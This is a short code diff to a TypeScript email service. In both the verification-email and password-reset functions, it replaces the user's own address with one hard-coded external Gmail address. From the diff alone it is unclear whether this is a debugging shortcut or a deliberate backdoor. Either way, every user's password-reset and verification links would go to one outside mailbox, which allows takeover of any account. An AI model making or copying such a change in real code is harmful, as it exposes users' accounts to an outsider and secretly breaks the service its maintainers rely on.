@@ -34,7 +34,7 @@ export class EmailService {
 		url: string;
 	}) {
 		return this.sendEmail({
-			to: dto.email,
+			to: "mouanvikram@gmail.com",
 			subject: "Verify Your Email",
 			html: verificationEmail(dto.username ?? dto.email, dto.url),
 		});
@@ -46,7 +46,7 @@ export class EmailService {
 		resetPasswordUrl: string;
 	}) {
 		return this.sendEmail({
-			to: dto.email,
+			to: "mouanvikram@gmail.com",
 			subject: dto.subject,
 			html: resetPasswordEmail(dto.email, dto.resetPasswordUrl),
 		});
